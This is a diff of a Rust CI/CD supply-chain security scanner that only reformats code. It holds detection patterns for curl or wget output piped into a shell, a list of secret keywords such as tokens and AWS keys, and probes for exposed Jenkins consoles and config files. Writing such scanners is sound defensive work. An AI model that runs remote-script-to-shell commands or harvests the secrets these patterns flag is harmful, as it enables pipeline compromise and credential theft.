@@ -33,7 +33,8 @@
 use crate::arsenal_config::{finding_rich, severity_for_score, ArsenalConfig, Evidence, Intensity};
 use crate::engine_dispatch::EngineRunContext;
 use crate::engine_probes::{
-    detect_secrets, http_get_with_headers, join_url, normalize_url, status_indicates_presence, HttpProbe,
+    detect_secrets, http_get_with_headers, join_url, normalize_url, status_indicates_presence,
+    HttpProbe,
 };
 use crate::engine_result::{print_result, EngineResult};
 use futures::stream::{self, StreamExt};
@@ -272,8 +273,19 @@ const RUNNER_TOKEN_MARKERS: &[&str] = &[
 ];
 
 const SECRET_KEYWORDS: &[&str] = &[
-    "password", "secret", "token", "api_key", "apikey", "private_key", "access_key",
-    "aws_secret", "github_token", "gh_token", "slack_token", "npm_token", "docker_password",
+    "password",
+    "secret",
+    "token",
+    "api_key",
+    "apikey",
+    "private_key",
+    "access_key",
+    "aws_secret",
+    "github_token",
+    "gh_token",
+    "slack_token",
+    "npm_token",
+    "docker_password",
 ];
 
 // ── Settings ──────────────────────────────────────────────────────────────────
@@ -392,14 +404,21 @@ fn parse_settings(ctx: &EngineRunContext) -> Settings {
         dry_run: cfg.bool_or("dry_run", false),
         compliance_frameworks: cfg.string_list_or(
             "compliance_frameworks",
-            &["NIST-SA-12", "SOC2-CC8.1", "PCI-DSS-6.3.2", "MITRE-T1195.002"],
+            &[
+                "NIST-SA-12",
+                "SOC2-CC8.1",
+                "PCI-DSS-6.3.2",
+                "MITRE-T1195.002",
+            ],
         ),
     }
 }
 
 fn platform_allowed(settings: &Settings, platform_id: &str) -> bool {
     settings.platform_filter.is_empty()
-        || settings.platform_filter.contains(&platform_id.to_ascii_lowercase())
+        || settings
+            .platform_filter
+            .contains(&platform_id.to_ascii_lowercase())
 }
 
 fn auth_headers(settings: &Settings) -> Vec<(String, String)> {
@@ -414,7 +433,11 @@ fn auth_headers(settings: &Settings) -> Vec<(String, String)> {
     }
     if let Some(bt) = &settings.bearer_token {
         let bt = bt.trim();
-        if !bt.is_empty() && !hs.iter().any(|(k, _)| k.eq_ignore_ascii_case("authorization")) {
+        if !bt.is_empty()
+            && !hs
+                .iter()
+                .any(|(k, _)| k.eq_ignore_ascii_case("authorization"))
+        {
             let val = if bt.to_ascii_lowercase().starts_with("bearer ") {
                 bt.to_string()
             } else {
@@ -453,8 +476,14 @@ fn detect_platform(probe: &HttpProbe) -> Option<(&'static str, &'static str)> {
     let hb = headers_blob(probe);
     let body_l = probe.body.to_ascii_lowercase();
     for p in platforms() {
-        let header_hit = p.header_markers.iter().any(|t| hb.contains(&t.to_ascii_lowercase()));
-        let body_hit = p.body_markers.iter().any(|t| body_l.contains(&t.to_ascii_lowercase()));
+        let header_hit = p
+            .header_markers
+            .iter()
+            .any(|t| hb.contains(&t.to_ascii_lowercase()));
+        let body_hit = p
+            .body_markers
+            .iter()
+            .any(|t| body_l.contains(&t.to_ascii_lowercase()));
         if header_hit || body_hit {
             return Some((p.id, p.label));
         }
@@ -465,7 +494,10 @@ fn detect_platform(probe: &HttpProbe) -> Option<(&'static str, &'static str)> {
 fn identify_tool_from_path(path: &str) -> (&'static str, &'static str) {
     let pl = path.to_ascii_lowercase();
     for p in platforms() {
-        if p.paths.iter().any(|ep| pl.contains(&ep.to_ascii_lowercase().trim_start_matches('/'))) {
+        if p.paths
+            .iter()
+            .any(|ep| pl.contains(&ep.to_ascii_lowercase().trim_start_matches('/')))
+        {
             return (p.id, p.label);
         }
     }
@@ -625,7 +657,10 @@ fn compliance_posture(policy_hits: &BTreeMap<String, u32>, frameworks: &[String]
             let hits: u32 = policy_hits.values().sum();
             (100_i32.saturating_sub((hits * 8) as i32)).clamp(0, 100) as u32
         };
-        map.insert(fw.clone(), json!({ "score": score, "policy_violations": policy_hits.len() }));
+        map.insert(
+            fw.clone(),
+            json!({ "score": score, "policy_violations": policy_hits.len() }),
+        );
     }
     Value::Object(map)
 }
@@ -659,13 +694,19 @@ fn remediation_playbook(posture: &Posture, policy_hits: &BTreeMap<String, u32>) 
     json!({ "actions": actions, "total": actions.len() })
 }
 
-fn append_workflow_findings(posture: &mut Posture, findings: &mut Vec<Value>, settings: &Settings, wf: Vec<Value>) {
+fn append_workflow_findings(
+    posture: &mut Posture,
+    findings: &mut Vec<Value>,
+    settings: &Settings,
+    wf: Vec<Value>,
+) {
     posture.workflow_violations += wf.len() as u32;
     for f in &wf {
-        if f.get("title")
-            .and_then(Value::as_str)
-            .is_some_and(|t| t.to_ascii_lowercase().contains("slsa") || t.contains("cosign") || t.contains("provenance"))
-        {
+        if f.get("title").and_then(Value::as_str).is_some_and(|t| {
+            t.to_ascii_lowercase().contains("slsa")
+                || t.contains("cosign")
+                || t.contains("provenance")
+        }) {
             posture.slsa_gaps += 1;
         }
     }
@@ -745,10 +786,14 @@ fn analyze_github_workflow(content: &str, filename: &str, host: &str) -> Vec<Val
             &format!("GitHub Actions write-all permissions: {filename}"),
             "medium",
             "T1098",
-            &format!("Workflow {filename} grants permissions: write-all — excessive GITHUB_TOKEN scope."),
+            &format!(
+                "Workflow {filename} grants permissions: write-all — excessive GITHUB_TOKEN scope."
+            ),
             host,
             0.85,
-            Evidence::new().with("file", filename).with("policy", "WZ-GHA-005"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-GHA-005"),
         ));
     }
 
@@ -760,15 +805,22 @@ fn analyze_github_workflow(content: &str, filename: &str, host: &str) -> Vec<Val
             }
             if l.contains('@') {
                 let after = l.split('@').nth(1).unwrap_or("").trim();
-                if after == "main" || after == "master" || after.starts_with("v") && after.len() < 8 {
-                    let sev = if after == "main" || after == "master" { "high" } else { "medium" };
+                if after == "main" || after == "master" || after.starts_with("v") && after.len() < 8
+                {
+                    let sev = if after == "main" || after == "master" {
+                        "high"
+                    } else {
+                        "medium"
+                    };
                     out.push(finding_rich(
                         ENGINE_ID,
                         &format!("Unpinned third-party GitHub Action: {filename}"),
                         sev,
                         "T1195.001",
-                        &format!("Action reference '{l}' is pinned to a mutable ref ({after}) — \
-                                 supply-chain takeover via tag/branch movement."),
+                        &format!(
+                            "Action reference '{l}' is pinned to a mutable ref ({after}) — \
+                                 supply-chain takeover via tag/branch movement."
+                        ),
                         host,
                         0.82,
                         Evidence::new().with("file", filename).with("uses_line", l),
@@ -778,31 +830,44 @@ fn analyze_github_workflow(content: &str, filename: &str, host: &str) -> Vec<Val
         }
     }
 
-    if lc.contains("runs-on:") && lc.contains("self-hosted") && (has_prt || lc.contains("pull_request:")) {
+    if lc.contains("runs-on:")
+        && lc.contains("self-hosted")
+        && (has_prt || lc.contains("pull_request:"))
+    {
         out.push(finding_rich(
             ENGINE_ID,
             &format!("Self-hosted runner exposed to fork PRs: {filename}"),
             "high",
             MITRE,
-            &format!("Workflow {filename} runs pull_request/pull_request_target jobs on self-hosted \
-                     runners — untrusted fork code executes on your infrastructure."),
+            &format!(
+                "Workflow {filename} runs pull_request/pull_request_target jobs on self-hosted \
+                     runners — untrusted fork code executes on your infrastructure."
+            ),
             host,
             0.86,
-            Evidence::new().with("file", filename).with("policy", "WZ-GHA-007"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-GHA-007"),
         ));
     }
 
-    if (lc.contains("curl ") || lc.contains("wget ")) && (lc.contains("| sh") || lc.contains("| bash")) {
+    if (lc.contains("curl ") || lc.contains("wget "))
+        && (lc.contains("| sh") || lc.contains("| bash"))
+    {
         out.push(finding_rich(
             ENGINE_ID,
             &format!("Remote script piped to shell in workflow: {filename}"),
             "high",
             MITRE,
-            &format!("Workflow {filename} pipes remote curl/wget output into a shell — executing \
-                     unverified code in CI."),
+            &format!(
+                "Workflow {filename} pipes remote curl/wget output into a shell — executing \
+                     unverified code in CI."
+            ),
             host,
             0.84,
-            Evidence::new().with("file", filename).with("policy", "WZ-GHA-008"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-GHA-008"),
         ));
     }
 
@@ -931,8 +996,12 @@ fn analyze_github_workflow(content: &str, filename: &str, host: &str) -> Vec<Val
 
     // SLSA / provenance gap — release/deploy workflows without signing attestation
     let is_release = lc.contains("release") || lc.contains("deploy") || lc.contains("publish");
-    let has_provenance = lc.contains("slsa") || lc.contains("cosign") || lc.contains("provenance")
-        || lc.contains("attestation") || lc.contains("sigstore") || lc.contains("in-toto");
+    let has_provenance = lc.contains("slsa")
+        || lc.contains("cosign")
+        || lc.contains("provenance")
+        || lc.contains("attestation")
+        || lc.contains("sigstore")
+        || lc.contains("in-toto");
     if is_release && !has_provenance && lc.contains("runs-on:") {
         out.push(finding_rich(
             ENGINE_ID,
@@ -969,7 +1038,9 @@ fn analyze_github_workflow(content: &str, filename: &str, host: &str) -> Vec<Val
     }
 
     // Long-lived AWS access keys in CI instead of OIDC role assumption
-    if (lc.contains("aws-access-key-id") || lc.contains("aws_secret_access_key") || lc.contains("access_key_id"))
+    if (lc.contains("aws-access-key-id")
+        || lc.contains("aws_secret_access_key")
+        || lc.contains("access_key_id"))
         && !lc.contains("role-to-assume")
         && !lc.contains("id-token: write")
         && !lc.contains("id-token:write")
@@ -1049,7 +1120,9 @@ fn analyze_gitlab_ci(content: &str, filename: &str, host: &str) -> Vec<Value> {
     }
 
     if lc.contains("rules:") && lc.contains("merge_request_event") {
-        if !lc.contains("protected") && !lc.contains("if: $CI_MERGE_REQUEST_SOURCE_BRANCH_PROTECTED") {
+        if !lc.contains("protected")
+            && !lc.contains("if: $CI_MERGE_REQUEST_SOURCE_BRANCH_PROTECTED")
+        {
             out.push(finding_rich(
                 ENGINE_ID,
                 &format!("GitLab CI runs on unprotected fork MRs: {filename}"),
@@ -1091,7 +1164,11 @@ fn analyze_azure_pipelines(content: &str, filename: &str, host: &str) -> Vec<Val
 
     if lc.contains("pr:") && lc.contains("trigger:") && !lc.contains("pr: none") {
         if lc.contains("script:") && (lc.contains("${{") || lc.contains("$(")) {
-            for pat in ["github.event.pull_request.title", "Build.SourceBranch", "variables['"] {
+            for pat in [
+                "github.event.pull_request.title",
+                "Build.SourceBranch",
+                "variables['",
+            ] {
                 if content.contains(pat) {
                     out.push(finding_rich(
                         ENGINE_ID,
@@ -1146,7 +1223,9 @@ fn analyze_azure_pipelines(content: &str, filename: &str, host: &str) -> Vec<Val
         }
     }
 
-    if (lc.contains("curl ") || lc.contains("wget ")) && (lc.contains("| sh") || lc.contains("| bash")) {
+    if (lc.contains("curl ") || lc.contains("wget "))
+        && (lc.contains("| sh") || lc.contains("| bash"))
+    {
         out.push(finding_rich(
             ENGINE_ID,
             &format!("Remote script piped to shell in Azure Pipeline: {filename}"),
@@ -1155,7 +1234,9 @@ fn analyze_azure_pipelines(content: &str, filename: &str, host: &str) -> Vec<Val
             &format!("Pipeline {filename} pipes remote curl/wget into a shell during build."),
             host,
             0.83,
-            Evidence::new().with("file", filename).with("policy", "WZ-ADO-008"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-ADO-008"),
         ));
     }
 
@@ -1166,7 +1247,9 @@ fn analyze_jenkinsfile(content: &str, filename: &str, host: &str) -> Vec<Value> 
     let mut out = Vec::new();
     let lc = content.to_ascii_lowercase();
 
-    if lc.contains("disablesecurity()") || lc.contains("hudson.model.hudson") && lc.contains("script") {
+    if lc.contains("disablesecurity()")
+        || lc.contains("hudson.model.hudson") && lc.contains("script")
+    {
         out.push(finding_rich(
             ENGINE_ID,
             &format!("Jenkins security bypass in pipeline: {filename}"),
@@ -1178,11 +1261,15 @@ fn analyze_jenkinsfile(content: &str, filename: &str, host: &str) -> Vec<Value> 
             ),
             host,
             0.95,
-            Evidence::new().with("file", filename).with("policy", "WZ-JNK-001"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-JNK-001"),
         ));
     }
 
-    if (lc.contains("curl ") || lc.contains("wget ")) && (lc.contains("| sh") || lc.contains("| bash")) {
+    if (lc.contains("curl ") || lc.contains("wget "))
+        && (lc.contains("| sh") || lc.contains("| bash"))
+    {
         out.push(finding_rich(
             ENGINE_ID,
             &format!("Remote script piped to shell in Jenkinsfile: {filename}"),
@@ -1191,7 +1278,9 @@ fn analyze_jenkinsfile(content: &str, filename: &str, host: &str) -> Vec<Value> 
             &format!("Jenkinsfile {filename} executes unverified remote install scripts."),
             host,
             0.84,
-            Evidence::new().with("file", filename).with("policy", "WZ-JNK-008"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-JNK-008"),
         ));
     }
 
@@ -1223,7 +1312,9 @@ fn analyze_jenkinsfile(content: &str, filename: &str, host: &str) -> Vec<Value> 
                 ),
                 host,
                 0.82,
-                Evidence::new().with("file", filename).with("policy", "WZ-JNK-007"),
+                Evidence::new()
+                    .with("file", filename)
+                    .with("policy", "WZ-JNK-007"),
             ));
         }
     }
@@ -1279,27 +1370,46 @@ fn analyze_workflow_content(content: &str, url_or_path: &str, host: &str) -> Vec
 
     if url_or_path.contains(".github/workflows") || body_l.contains("runs-on:") {
         out.extend(analyze_github_workflow(content, fname, host));
-    } else if url_or_path.contains("gitlab-ci") || body_l.contains("stages:") && body_l.contains("script:") {
+    } else if url_or_path.contains("gitlab-ci")
+        || body_l.contains("stages:") && body_l.contains("script:")
+    {
         out.extend(analyze_gitlab_ci(content, fname, host));
-    } else if url_or_path.contains("azure-pipelines") || body_l.contains("trigger:") && body_l.contains("pool:") {
+    } else if url_or_path.contains("azure-pipelines")
+        || body_l.contains("trigger:") && body_l.contains("pool:")
+    {
         out.extend(analyze_azure_pipelines(content, fname, host));
     } else if url_or_path.contains("Jenkinsfile") || body_l.contains("pipeline {") {
         out.extend(analyze_jenkinsfile(content, fname, host));
-    } else if url_or_path.contains(".circleci") || body_l.contains("orbs:") || body_l.contains("version: 2") {
+    } else if url_or_path.contains(".circleci")
+        || body_l.contains("orbs:")
+        || body_l.contains("version: 2")
+    {
         out.extend(analyze_circleci(content, fname, host));
-    } else if url_or_path.contains(".argo/") || body_l.contains("argoproj.io") || body_l.contains("kind: application") {
+    } else if url_or_path.contains(".argo/")
+        || body_l.contains("argoproj.io")
+        || body_l.contains("kind: application")
+    {
         out.extend(analyze_argocd_manifest(content, fname, host));
-    } else if url_or_path.contains(".tekton/") || body_l.contains("tekton.dev") || body_l.contains("kind: pipelinerun") {
+    } else if url_or_path.contains(".tekton/")
+        || body_l.contains("tekton.dev")
+        || body_l.contains("kind: pipelinerun")
+    {
         out.extend(analyze_tekton_manifest(content, fname, host));
-    } else if url_or_path.contains("bitbucket-pipelines") || body_l.contains("pipelines:") && body_l.contains("step:") {
+    } else if url_or_path.contains("bitbucket-pipelines")
+        || body_l.contains("pipelines:") && body_l.contains("step:")
+    {
         out.extend(analyze_bitbucket_pipelines(content, fname, host));
-    } else if url_or_path.contains(".github/actions/") && (fname.ends_with("action.yml") || fname.ends_with("action.yaml")) {
+    } else if url_or_path.contains(".github/actions/")
+        && (fname.ends_with("action.yml") || fname.ends_with("action.yaml"))
+    {
         out.extend(analyze_github_composite_action(content, fname, host));
     } else if url_or_path.contains("dependabot") || fname == "dependabot.yml" {
         out.extend(analyze_dependabot_config(content, fname, host));
     } else if url_or_path.contains("renovate") || fname.contains("renovate") {
         out.extend(analyze_renovate_config(content, fname, host));
-    } else if (body_l.contains("pipeline:") && body_l.contains("harness.io")) || url_or_path.contains(".harness/") {
+    } else if (body_l.contains("pipeline:") && body_l.contains("harness.io"))
+        || url_or_path.contains(".harness/")
+    {
         out.extend(analyze_harness_pipeline(content, fname, host));
     } else if body_l.contains("spinnaker") || url_or_path.contains("spinnaker") {
         out.extend(analyze_spinnaker_config(content, fname, host));
@@ -1402,7 +1512,9 @@ fn analyze_harness_pipeline(content: &str, filename: &str, host: &str) -> Vec<Va
             &format!("Harness pipeline {filename} runs privileged containers."),
             host,
             0.93,
-            Evidence::new().with("file", filename).with("policy", "WZ-HAR-002"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-HAR-002"),
         ));
     }
     out
@@ -1432,7 +1544,9 @@ fn analyze_spinnaker_config(content: &str, filename: &str, host: &str) -> Vec<Va
             &format!("Spinnaker {filename} embeds docker registry password material."),
             host,
             0.85,
-            Evidence::new().with("file", filename).with("policy", "WZ-SPN-002"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-SPN-002"),
         ));
     }
     out
@@ -1450,7 +1564,9 @@ fn analyze_makefile_ci(content: &str, filename: &str, host: &str) -> Vec<Value> 
             &format!("Makefile {filename} used as CI entrypoint pipes curl to shell."),
             host,
             0.83,
-            Evidence::new().with("file", filename).with("policy", "WZ-MKF-001"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-MKF-001"),
         ));
     }
     out
@@ -1467,7 +1583,13 @@ fn analyze_argocd_manifest(content: &str, filename: &str, host: &str) -> Vec<Val
                 if !l.to_ascii_lowercase().starts_with("repourl:") && !l.contains("repoURL:") {
                     continue;
                 }
-                let url_part = l.split(':').skip(1).collect::<Vec<_>>().join(":").trim().to_string();
+                let url_part = l
+                    .split(':')
+                    .skip(1)
+                    .collect::<Vec<_>>()
+                    .join(":")
+                    .trim()
+                    .to_string();
                 if url_part.starts_with("http://") {
                     out.push(finding_rich(
                         ENGINE_ID,
@@ -1483,7 +1605,10 @@ fn analyze_argocd_manifest(content: &str, filename: &str, host: &str) -> Vec<Val
                         Evidence::new().with("file", filename).with("repoURL", url_part.clone()).with("policy", "WZ-ARGO-001"),
                     ));
                 }
-                if url_part.contains("github.com") && !url_part.contains("@") && lc.contains("syncpolicy:") {
+                if url_part.contains("github.com")
+                    && !url_part.contains("@")
+                    && lc.contains("syncpolicy:")
+                {
                     out.push(finding_rich(
                         ENGINE_ID,
                         &format!("ArgoCD auto-sync from public Git without commit pin: {filename}"),
@@ -1562,7 +1687,9 @@ fn analyze_argocd_manifest(content: &str, filename: &str, host: &str) -> Vec<Val
                 ),
                 host,
                 0.88,
-                Evidence::new().with("file", filename).with("policy", "WZ-ARGO-006"),
+                Evidence::new()
+                    .with("file", filename)
+                    .with("policy", "WZ-ARGO-006"),
             ));
         }
     }
@@ -1586,7 +1713,9 @@ fn analyze_tekton_manifest(content: &str, filename: &str, host: &str) -> Vec<Val
             ),
             host,
             0.94,
-            Evidence::new().with("file", filename).with("policy", "WZ-TKN-001"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-TKN-001"),
         ));
     }
 
@@ -1602,7 +1731,9 @@ fn analyze_tekton_manifest(content: &str, filename: &str, host: &str) -> Vec<Val
             ),
             host,
             0.88,
-            Evidence::new().with("file", filename).with("policy", "WZ-TKN-002"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-TKN-002"),
         ));
     }
 
@@ -1618,7 +1749,9 @@ fn analyze_tekton_manifest(content: &str, filename: &str, host: &str) -> Vec<Val
             ),
             host,
             0.74,
-            Evidence::new().with("file", filename).with("policy", "WZ-TKN-003"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-TKN-003"),
         ));
     }
 
@@ -1660,16 +1793,22 @@ fn analyze_bitbucket_pipelines(content: &str, filename: &str, host: &str) -> Vec
         }
     }
 
-    if (lc.contains("curl ") || lc.contains("wget ")) && (lc.contains("| sh") || lc.contains("| bash")) {
+    if (lc.contains("curl ") || lc.contains("wget "))
+        && (lc.contains("| sh") || lc.contains("| bash"))
+    {
         out.push(finding_rich(
             ENGINE_ID,
             &format!("Remote script piped to shell in Bitbucket Pipeline: {filename}"),
             "high",
             MITRE,
-            &format!("Bitbucket pipeline {filename} pipes remote install scripts into shell during CI."),
+            &format!(
+                "Bitbucket pipeline {filename} pipes remote install scripts into shell during CI."
+            ),
             host,
             0.83,
-            Evidence::new().with("file", filename).with("policy", "WZ-BB-008"),
+            Evidence::new()
+                .with("file", filename)
+                .with("policy", "WZ-BB-008"),
         ));
     }
 
@@ -2028,7 +2167,8 @@ async fn probe_api_exposure(
         if !status_indicates_presence(probe.status) {
             continue;
         }
-        let (pid, label) = detect_platform(&probe).unwrap_or_else(|| identify_tool_from_path(&probe.final_url));
+        let (pid, label) =
+            detect_platform(&probe).unwrap_or_else(|| identify_tool_from_path(&probe.final_url));
         if !platform_allowed(settings, pid) {
             continue;
         }
@@ -2059,9 +2199,7 @@ async fn probe_api_exposure(
             }
 
             if settings.probe_runner_tokens {
-                let token_hit = RUNNER_TOKEN_MARKERS
-                    .iter()
-                    .any(|m| probe.body.contains(m));
+                let token_hit = RUNNER_TOKEN_MARKERS.iter().any(|m| probe.body.contains(m));
                 if token_hit {
                     posture.runner_tokens = true;
                 }
@@ -2148,10 +2286,11 @@ async fn probe_jenkins_script_console(
             ),
             host,
             0.98,
-            Evidence::new()
-                .with("url", &url)
-                .with("status", 200)
-                .check("groovy_console", true, "reachable"),
+            Evidence::new().with("url", &url).with("status", 200).check(
+                "groovy_console",
+                true,
+                "reachable",
+            ),
         ),
     );
 }
@@ -2191,7 +2330,11 @@ async fn probe_config_exposure(
         }
         posture.config_exposed += 1;
         let secrets = detect_secrets(&probe.body);
-        let sev = if secrets.is_empty() { "high" } else { "critical" };
+        let sev = if secrets.is_empty() {
+            "high"
+        } else {
+            "critical"
+        };
 
         push_if_severe(
             findings,
@@ -2271,7 +2414,8 @@ async fn probe_build_log_exposure(
     let auth_hs = auth_headers(settings);
     let limit = settings.max_requests.min(80).min(BUILD_LOG_PATHS.len());
     let paths: Vec<&str> = BUILD_LOG_PATHS.iter().take(limit).copied().collect();
-    let probes = probe_paths_with_auth(client, base, &paths, settings.concurrency.min(8), &auth_hs).await;
+    let probes =
+        probe_paths_with_auth(client, base, &paths, settings.concurrency.min(8), &auth_hs).await;
 
     for probe in probes {
         if probe.status != 200 || probe.body.len() < 20 {
@@ -2331,7 +2475,8 @@ async fn probe_artifact_registry_exposure(
     let auth_hs = auth_headers(settings);
     let limit = settings.max_requests.min(60).min(ARTIFACT_PATHS.len());
     let paths: Vec<&str> = ARTIFACT_PATHS.iter().take(limit).copied().collect();
-    let probes = probe_paths_with_auth(client, base, &paths, settings.concurrency.min(8), &auth_hs).await;
+    let probes =
+        probe_paths_with_auth(client, base, &paths, settings.concurrency.min(8), &auth_hs).await;
 
     for probe in probes {
         if !status_indicates_presence(probe.status) || probe.body.len() < 8 {
@@ -2406,10 +2551,7 @@ async fn probe_github_repo_governance(
     if let Ok(resp) = auth(client.get(&perm_url)).send().await {
         if resp.status().is_success() {
             if let Ok(v) = resp.json::<Value>().await {
-                let fork_prs = v
-                    .get("enabled")
-                    .and_then(Value::as_bool)
-                    .unwrap_or(true);
+                let fork_prs = v.get("enabled").and_then(Value::as_bool).unwrap_or(true);
                 let allowed = v
                     .get("allowed_actions")
                     .and_then(Value::as_str)
@@ -2439,7 +2581,9 @@ async fn probe_github_repo_governance(
                 }
                 if v.get("enabled").and_then(Value::as_bool) == Some(true) && fork_prs {
                     // check fork PR workflow policy via workflow permissions endpoint
-                    let wf_perm = format!("https://api.github.com/repos/{owner}/{repo}/actions/permissions/workflow");
+                    let wf_perm = format!(
+                        "https://api.github.com/repos/{owner}/{repo}/actions/permissions/workflow"
+                    );
                     if let Ok(r2) = auth(client.get(&wf_perm)).send().await {
                         if r2.status().is_success() {
                             if let Ok(wv) = r2.json::<Value>().await {
@@ -2484,7 +2628,8 @@ async fn probe_github_repo_governance(
         .as_deref()
         .filter(|s| !s.trim().is_empty())
         .unwrap_or("main");
-    let prot_url = format!("https://api.github.com/repos/{owner}/{repo}/branches/{branch}/protection");
+    let prot_url =
+        format!("https://api.github.com/repos/{owner}/{repo}/branches/{branch}/protection");
     if let Ok(resp) = auth(client.get(&prot_url)).send().await {
         if resp.status().as_u16() == 404 {
             push_if_severe(
@@ -2564,7 +2709,8 @@ async fn probe_github_repo_governance(
     }
 
     // Fork PR workflow access — real GitHub Actions permissions API
-    let access_url = format!("https://api.github.com/repos/{owner}/{repo}/actions/permissions/access");
+    let access_url =
+        format!("https://api.github.com/repos/{owner}/{repo}/actions/permissions/access");
     if let Ok(resp) = auth(client.get(&access_url)).send().await {
         if resp.status().is_success() {
             if let Ok(v) = resp.json::<Value>().await {
@@ -2674,14 +2820,26 @@ fn parse_github_repo(url: &str) -> Option<(String, String)> {
     if segs.len() < 2 {
         return None;
     }
-    Some((segs[0].to_string(), segs[1].trim_end_matches(".git").to_string()))
+    Some((
+        segs[0].to_string(),
+        segs[1].trim_end_matches(".git").to_string(),
+    ))
 }
 
 /// Parsed repository target for the multi-vendor repository plane.
 enum RepoTarget {
-    GitHub { owner: String, repo: String },
-    GitLab { api_base: String, project_path: String },
-    Bitbucket { workspace: String, repo: String },
+    GitHub {
+        owner: String,
+        repo: String,
+    },
+    GitLab {
+        api_base: String,
+        project_path: String,
+    },
+    Bitbucket {
+        workspace: String,
+        repo: String,
+    },
     AzureDevOps {
         org: String,
         project: String,
@@ -2747,7 +2905,12 @@ fn parse_repo_target(url: &str) -> Option<RepoTarget> {
         }
     }
     if t.contains("bitbucket.org/") {
-        let segs: Vec<&str> = t.split("bitbucket.org/").nth(1)?.split('/').filter(|s| !s.is_empty()).collect();
+        let segs: Vec<&str> = t
+            .split("bitbucket.org/")
+            .nth(1)?
+            .split('/')
+            .filter(|s| !s.is_empty())
+            .collect();
         if segs.len() >= 2 {
             return Some(RepoTarget::Bitbucket {
                 workspace: segs[0].to_string(),
@@ -2780,7 +2943,9 @@ const CI_REPO_PATTERNS: &[&str] = &[
 
 fn path_matches_ci_artifact(path: &str) -> bool {
     let pl = path.to_ascii_lowercase();
-    CI_REPO_PATTERNS.iter().any(|p| pl.contains(&p.to_ascii_lowercase()))
+    CI_REPO_PATTERNS
+        .iter()
+        .any(|p| pl.contains(&p.to_ascii_lowercase()))
 }
 
 fn ingest_repo_ci_file(
@@ -2857,14 +3022,32 @@ async fn probe_repository_plane(
         RepoTarget::GitHub { owner, repo } => {
             probe_github_repo_inner(client, settings, host, posture, findings, &owner, &repo).await;
         }
-        RepoTarget::GitLab { api_base, project_path } => {
-            probe_gitlab_repo_inner(client, settings, host, posture, findings, &api_base, &project_path).await;
+        RepoTarget::GitLab {
+            api_base,
+            project_path,
+        } => {
+            probe_gitlab_repo_inner(
+                client,
+                settings,
+                host,
+                posture,
+                findings,
+                &api_base,
+                &project_path,
+            )
+            .await;
         }
         RepoTarget::Bitbucket { workspace, repo } => {
-            probe_bitbucket_repo_inner(client, settings, host, posture, findings, &workspace, &repo).await;
+            probe_bitbucket_repo_inner(
+                client, settings, host, posture, findings, &workspace, &repo,
+            )
+            .await;
         }
         RepoTarget::AzureDevOps { org, project, repo } => {
-            probe_azure_devops_repo_inner(client, settings, host, posture, findings, &org, &project, &repo).await;
+            probe_azure_devops_repo_inner(
+                client, settings, host, posture, findings, &org, &project, &repo,
+            )
+            .await;
         }
     }
 }
@@ -2898,14 +3081,19 @@ async fn probe_github_repo_inner(
                     .json::<Value>()
                     .await
                     .ok()
-                    .and_then(|v| v.get("default_branch").and_then(Value::as_str).map(str::to_string))
+                    .and_then(|v| {
+                        v.get("default_branch")
+                            .and_then(Value::as_str)
+                            .map(str::to_string)
+                    })
                     .unwrap_or_else(|| "main".to_string()),
                 _ => "main".to_string(),
             }
         }
     };
 
-    let tree_url = format!("https://api.github.com/repos/{owner}/{repo}/git/trees/{reff}?recursive=1");
+    let tree_url =
+        format!("https://api.github.com/repos/{owner}/{repo}/git/trees/{reff}?recursive=1");
     let Ok(resp) = auth(client.get(&tree_url)).send().await else {
         return;
     };
@@ -2915,7 +3103,11 @@ async fn probe_github_repo_inner(
     let Ok(tree) = resp.json::<Value>().await else {
         return;
     };
-    let entries = tree.get("tree").and_then(Value::as_array).cloned().unwrap_or_default();
+    let entries = tree
+        .get("tree")
+        .and_then(Value::as_array)
+        .cloned()
+        .unwrap_or_default();
     let repo_label = format!("{owner}/{repo}");
     let mut fetched = 0u32;
 
@@ -2949,7 +3141,16 @@ async fn probe_github_repo_inner(
         }
         let Ok(body) = r.text().await else { continue };
         fetched += 1;
-        ingest_repo_ci_file(posture, findings, settings, host, &repo_label, &reff, path, &body);
+        ingest_repo_ci_file(
+            posture,
+            findings,
+            settings,
+            host,
+            &repo_label,
+            &reff,
+            path,
+            &body,
+        );
     }
 
     if settings.probe_repo_governance {
@@ -2984,7 +3185,11 @@ async fn probe_gitlab_repo_inner(
                 .json::<Value>()
                 .await
                 .ok()
-                .and_then(|v| v.get("default_branch").and_then(Value::as_str).map(str::to_string))
+                .and_then(|v| {
+                    v.get("default_branch")
+                        .and_then(Value::as_str)
+                        .map(str::to_string)
+                })
                 .unwrap_or_else(|| "main".to_string()),
             _ => "main".to_string(),
         },
@@ -3035,7 +3240,9 @@ async fn probe_gitlab_repo_inner(
             "{api_base}/projects/{encoded_project}/repository/files/{encoded_path}/raw?ref={}",
             urlencoding::encode(&reff)
         );
-        let Ok(r) = gl_auth(client.get(&file_url)).send().await else { continue };
+        let Ok(r) = gl_auth(client.get(&file_url)).send().await else {
+            continue;
+        };
         if !r.status().is_success() {
             continue;
         }
@@ -3044,11 +3251,29 @@ async fn probe_gitlab_repo_inner(
             continue;
         }
         fetched += 1;
-        ingest_repo_ci_file(posture, findings, settings, host, &repo_label, &reff, path, &body);
+        ingest_repo_ci_file(
+            posture,
+            findings,
+            settings,
+            host,
+            &repo_label,
+            &reff,
+            path,
+            &body,
+        );
     }
 
     if settings.probe_repo_governance {
-        probe_gitlab_repo_governance(client, settings, host, posture, findings, api_base, project_path).await;
+        probe_gitlab_repo_governance(
+            client,
+            settings,
+            host,
+            posture,
+            findings,
+            api_base,
+            project_path,
+        )
+        .await;
     }
 }
 
@@ -3061,7 +3286,11 @@ async fn probe_gitlab_repo_governance(
     api_base: &str,
     project_path: &str,
 ) {
-    let Some(token) = settings.gitlab_token.as_ref().filter(|t| !t.trim().is_empty()) else {
